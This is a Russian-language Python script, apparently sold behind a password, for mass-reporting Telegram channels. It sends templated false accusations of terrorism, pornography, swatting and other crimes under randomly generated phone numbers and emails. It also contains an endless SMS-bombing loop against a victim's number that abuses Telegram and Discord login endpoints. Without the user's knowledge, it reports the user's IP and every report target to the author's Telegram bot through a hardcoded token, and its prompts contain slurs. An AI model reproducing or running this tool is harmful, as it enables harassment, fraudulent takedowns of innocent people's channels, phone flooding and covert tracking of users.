import requests
import random
import time
import socket
from fake_useragent import UserAgent

# Учетные данные Telegram-бота
BOT_TOKEN = "7211390464:AAFaizSqi-nFdpUcvYDMdod6Y_lHGGi22mQ"
CHAT_ID = "7344283312"

# Словарь нарушений с 6 вариантами текста для каждого нарушения.
violations = {
    1: ['Спам 14.3 КоАП РФ', [
        'Уважаемая служба поддержки, канал {username} активно занимается спамом. Примите меры.',
        'Канал {username} нарушает правила, рассылка спама. Прошу принять меры.',
        'Канал {username} занимается спамом в чатах Telegram. Просьба принять меры.',
        'Канал {username} отправляет спам-сообщения в чатах. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} занимается рассылкой спама. Прошу принять меры.',
        'Канал {username} спамит в чатах Telegram. Требуются меры.'
    ]],
    2: ['Мошенничество 159 УК РФ', [
        'Обратите внимание на канал {username}, подозревается в мошенничестве. Проверьте его действия.',
        'Канал {username} участвует в мошеннических схемах. Просьба принять меры.',
        'Уважаемая служба поддержки, канал {username} занимается мошенничеством. Требуются меры.',
        'Канал {username} замечен в мошенничестве. Прошу проверить.',
        'Прошу обратить внимание на канал {username}, возможное мошенничество. Необходимо вмешательство.',
        'Канал {username} подозревается в мошеннических действиях. Проверьте.'
    ]],
    3: ['Порнография 242.1 УК РФ', [
        'Уважаемая служба поддержки, канал {username} распространяет порнографию. Примите меры.',
        'Канал {username} нарушает правила, распространение порнографии. Прошу принять меры.',
        'Канал {username} распространяет порнографический контент. Просьба принять меры.',
        'Канал {username} размещает порнографические материалы. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} распространяет порнографию. Прошу принять меры.',
        'Канал {username} распространяет порнографию в чатах Telegram. Требуются меры.'
    ]],
    4: ['Нарушение правил', [
        'Уважаемая служба поддержки, канал {username} нарушает правила платформы. Примите меры.',
        'Канал {username} систематически нарушает правила. Прошу принять меры.',
        'Канал {username} нарушает установленные правила. Просьба принять меры.',
        'Канал {username} нарушает правила поведения. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} нарушает правила. Прошу принять меры.',
        'Канал {username} нарушает правила Telegram. Требуются меры.'
    ]],
    5: ['Оскорбления 5.61 КоАП РФ', [
        'Уважаемая служба поддержки, канал {username} оскорбляет пользователей. Примите меры.',
        'Канал {username} ведет себя агрессивно и оскорбляет других. Прошу принять меры.',
        'Канал {username} оскорбляет участников чатов. Просьба принять меры.',
        'Канал {username} распространяет оскорбительные сообщения. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} оскорбляет других участников. Прошу принять меры.',
        'Канал {username} ведет себя оскорбительно в чатах Telegram. Требуются меры.'
    ]],
    6: ['Нарушение авторских прав 146 УК РФ', [
        'Уважаемая служба поддержки, канал {username} нарушает авторские права. Примите меры.',
        'Канал {username} размещает контент без разрешения. Прошу принять меры.',
        'Канал {username} систематически нарушает авторские права. Просьба принять меры.',
        'Канал {username} размещает защищенные материалы. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} нарушает авторские права. Прошу принять меры.',
        'Канал {username} нарушает авторские права в чатах Telegram. Требуются меры.'
    ]],
    7: ['Пропаганда насилия 282 УК РФ', [
        'Уважаемая служба поддержки, канал {username} распространяет материалы с насилием. Примите меры.',
        'Канал {username} пропагандирует насилие. Прошу принять меры.',
        'Канал {username} размещает материалы с насилием. Просьба принять меры.',
        'Канал {username} пропагандирует насилие. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} распространяет насильственные материалы. Прошу принять меры.',
        'Канал {username} пропагандирует насилие в чатах Telegram. Требуются меры.'
    ]],
    8: ['Пропаганда наркотиков 230 УК РФ', [
        'Уважаемая служба поддержки, канал {username} пропагандирует наркотики. Примите меры.',
        'Канал {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Канал {username} занимается пропагандой наркотиков. Просьба принять меры.',
        'Канал {username} пропагандирует наркотики. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Канал {username} пропагандирует наркотики в чатах Telegram. Требуются меры.'
    ]],
    9: ['Терроризм 205 УК РФ', [
        'Уважаемая служба поддержки, канал {username} связан с терроризмом. Примите меры.',
        'Канал {username} подозревается в терроризме. Прошу принять меры.',
        'Канал {username} связан с террористическими действиями. Просьба принять меры.',
        'Канал {username} распространяет террористические материалы. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} может быть причастен к терроризму. Прошу принять меры.',
        'Канал {username} подозревается в террористической деятельности. Требуются меры.'
    ]],
    10: ['Фейковые новости 207.3 УК РФ', [
        'Уважаемая служба поддержки, канал {username} распространяет фейковые новости. Примите меры.',
        'Канал {username} занимается дезинформацией. Прошу принять меры.',
        'Канал {username} распространяет ложные сведения. Просьба принять меры.',
        'Канал {username} распространяет фейки. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} распространяет фейковые новости. Прошу принять меры.',
        'Канал {username} занимается дезинформацией в чатах Telegram. Требуются меры.'
    ]],
    11: ['Нарушение конфиденциальности 13.14 КоАП РФ', [
        'Уважаемая служба поддержки, канал {username} нарушает конфиденциальность. Примите меры.',
        'Канал {username} распространяет личные данные. Прошу принять меры.',
        'Канал {username} нарушает правила конфиденциальности. Просьба принять меры.',
        'Канал {username} нарушает конфиденциальность. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} нарушает конфиденциальность. Прошу принять меры.',
        'Канал {username} распространяет личные данные в чатах Telegram. Требуются меры.'
    ]],
    12: ['Хакерство 274.1 УК РФ', [
        'Уважаемая служба поддержки, канал {username} занимается хакерством. Примите меры.',
        'Канал {username} подозревается в хакерстве. Прошу принять меры.',
        'Канал {username} занимается хакерской деятельностью. Просьба принять меры.',
        'Канал {username} подозревается в хакерской деятельности. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} занимается хакерством. Прошу принять меры.',
        'Канал {username} занимается хакерством в чатах Telegram. Требуются меры.'
    ]],
    13: ['Угроза сватом 207 УК РФ (Сваттинг (от английской аббревиатуры SWAT) — тактика домогательства, которая заключается во введении полиции в заблуждение)', [
        'Уважаемая служба поддержки, канал {username} угражает сватом. Примите меры.',
        'Канал {username} подозревается в угрозе сватом. Прошу принять меры.',
        'Канал {username} занимается угрозами сватом. Просьба принять меры.',
        'Канал {username} подозревается в свате. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} занимается сватом. Прошу принять меры.',
        'Канал {username} занимается сватом в чатах Telegram. Требуются меры.'
    ]],
    14: ['Угроза деаноном 137 УК РФ (Деанон или доксинг — это раскрытие анонимности личности в сети Интернет или сопоставление виртуального аккаунта реальному человеку.)', [
        'Уважаемая служба поддержки, канал {username} угражает деаноном. Примите меры.',
        'Канал {username} подозревается в угрозе деаноном. Прошу принять меры.',
        'Канал {username} занимается угрозами деаноном. Просьба принять меры.',
        'Канал {username} подозревается в деаноне. Пожалуйста, разберитесь.',
        'Заметил, что канал {username} занимается деаноном. Прошу принять меры.',
        'Канал {username} занимается деаноном в чатах Telegram. Требуются меры.'
    ]]
}

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def log_activation():
    ip_address = socket.gethostbyname(socket.gethostname())
    message = f"Скрипт активирован. IP-адрес: {ip_address}"
    send_telegram_message(message)

def log_complaint(username, violation, num_complaints):
    if violation == "Своя жалоба":
        message = (f"Отправка жалобы:\nПользователь: {username}\n"
                   f"Тип жалобы: Своя жалоба\n"
                   f"Количество жалоб: {num_complaints}")
    else:
        message = (f"Отправка жалобы:\nПользователь: {username}\n"
                   f"Тип жалобы: {violations[violation][0]}\n"
                   f"Количество жалоб: {num_complaints}")
    send_telegram_message(message)

def generate_complaint(username, violation):
    return random.choice(violations[violation][1]).format(username=username)

def generate_phone_number():
    # Обновление логики генерации номера телефона.
    template = "+7**********"
    return ''.join(random.choice('0123456789') if char == '*' else char for char in template)

def generate_email():
    domains = ["gmail.com", "rambler.ru", "yahoo.com", "mail.ru"]
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def send_complaint_telegram_support(complaint, phone_number, email):
    url = "https://telegram.org/support"
    headers = {'content-type': 'application/json'}
    data = {
        'complaint': complaint,
        'support_problem': complaint,
        'support_phone': phone_number,
        'support_email': email
    }
    global complaint_count, error_count
    try:
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            complaint_count += 1
            print_colored_text(f"Жалоба на {username} успешно доставлена от {phone_number}, email: {email}", "green")
        else:
            error_count += 1
            print_colored_text(f"Ошибка при отправке жалобы на {username} от {phone_number}, email: {email}", "red")
    except Exception as e:
        error_count += 1
        print_colored_text(f"Ошибка при отправке жалобы на {username} от {phone_number}, email: {email}", "red")

def log_spam_attack(number):
    message = f"Запущена спам-атака на номер: {number}"
    send_telegram_message(message)

def spam_phone_numbers(number):
    user = UserAgent().random
    headers = {'User-Agent': user}
    count = 0
    while True:
        try:
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={"phone": number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': number})
            count += 1
            print(f"Количество атак: {count}")
            time.sleep(0.01)  # Пауза между запросами
        except Exception as e:
            print('Ошибка при спам атаке')
            print_colored_text("Перезапустите скрипт", "red")
            break

complaint_count = 0
error_count = 0

log_activation()

def print_colored_text(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m"
    }
    reset = "\033[0m"
    print(colors[color] + text + reset)

def print_dobryak():
    art = [
    (" ███████╗ ██████╗ ███████╗████████╗     ██████╗ ██╗   ██╗     ██████╗  █████╗ ███████╗███████╗ ", "red"),
    (" ██╔════╝██╔═══██╗██╔════╝╚══██╔══╝     ██╔══██╗╚██╗ ██╔╝     ██╔══██╗██╔══██╗╚══███╔╝██╔════╝ ", "green"),
    (" ███████╗██║   ██║█████╗     ██║        ██████╔╝ ╚████╔╝      ██████╔╝███████║  ███╔╝ █████╗   ", "yellow"),
    (" ╚════██║██║   ██║██╔══╝     ██║        ██╔══██╗  ╚██╔╝       ██╔══██╗██╔══██║ ███╔╝  ██╔══╝   ", "blue"),
    (" ███████║╚██████╔╝██║        ██║███████╗██████╔╝   ██║███████╗██║  ██║██║  ██║███████╗███████╗ ", "magenta"),
    (" ╚══════╝ ╚═════╝ ╚═╝        ╚═╝╚══════╝╚═════╝    ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝", "cyan"),
    ]
    
    for line, color in art:
        print_colored_text(line, color)
    print_colored_text("made by t.me/egorrrka228 "*3, "white")
    print("\n")
    print_colored_text("Если вы хотите ускорить процесс блокировки канала, как можно больше отправьте жалоб на сообщения/историю канала, и выбирайте соответствующую причину.", "yellow")

def print_complaint_options():
    print_colored_text("###########################################", "cyan")
    for key, value in violations.items():
        print_colored_text(f"# {key} - {value[0]}", "cyan")
        print_colored_text(f"   {value[0]} - Используйте, если пользователь {value[0].lower()}.", "yellow")
    print_colored_text("# 666 - Своя жалоба", "cyan")
    print_colored_text("   Своя жалоба - Введите свой текст жалобы.", "yellow")
    print_colored_text("###########################################", "cyan")

password = input("Пожалуйста, введите пароль: ")
print_dobryak()

if password == "k7h4v8dk5oe7ths6kf9RAZE":
    print_colored_text("Пароль верный. Добро пожаловать! Сноси пидоров)))", "green")
    print_colored_text("1 - Спам жалобами", "cyan")
    mode = int(input("Выберите режим: "))

    if mode == 1:
        print_colored_text("Режим: Спам жалобами", "yellow")
        print_colored_text("В этом режиме вы можете отправлять жалобы на разные ТГ каналы.", "yellow")
        username = input("Введите юзернейм и айди(можно посмотреть в AyuGram) канала через пробел. Пример: username: 'юзернейм жертвы' ID: 'айди жертвы': ")
        if username.lower() == "@egorrrka228" or username == "@Raze151" or username == "1558190528" or username == "7259638064":
            print("Ты тупой? жалобы на создателя скрипта кидаешь? пшл нах отсюда!!!")
            print_colored_text("Перезапустите скрипт", "red")

        else:
            print_complaint_options()
            violation = int(input("Введите номер типа жалобы: "))
            if violation == 666:
                custom_complaint = input("Введите текст жалобы: ")
                num_complaints = int(input("Введите количество жалоб для отправки: "))
                log_complaint(username, "Своя жалоба", num_complaints)
                phone_numbers = [generate_phone_number() for _ in range(num_complaints)]
                emails = [generate_email() for _ in range(num_complaints)]
                print("Отправка жалоб...")
                for phone_number, email in zip(phone_numbers, emails):
                    send_complaint_telegram_support(custom_complaint, phone_number, email)
                    time.sleep(0.01)  # Пауза между отправкой жалоб
            else:
                num_complaints = int(input("Введите количество жалоб для отправки: "))
                log_complaint(username, violation, num_complaints)
                phone_numbers = [generate_phone_number() for _ in range(num_complaints)]
                emails = [generate_email() for _ in range(num_complaints)]
                print("Отправка жалоб...")
                for phone_number, email in zip(phone_numbers, emails):
                    complaint = generate_complaint(username, violation)
                    send_complaint_telegram_support(complaint, phone_number, email)
                    time.sleep(0.01)  # Пауза между отправкой жалоб

            print(f"Количество отправленных жалоб: {complaint_count}")
            print(f"Количество ошибок: {error_count}")
            print(f"Пользователь: {username}")

            if violation == 666:
                print(f"Тип жалобы: Своя жалоба")
            else:
                print(f"Тип жалобы: {violations[violation][0]}")
                print_colored_text("Перезапустите скрипт", "red")

else:
    print("Неверный пароль. Пошёл нахуй). Покупать ключ у t.me/egorrrka228")
    print_colored_text("Перезапустите скрипт", "red")

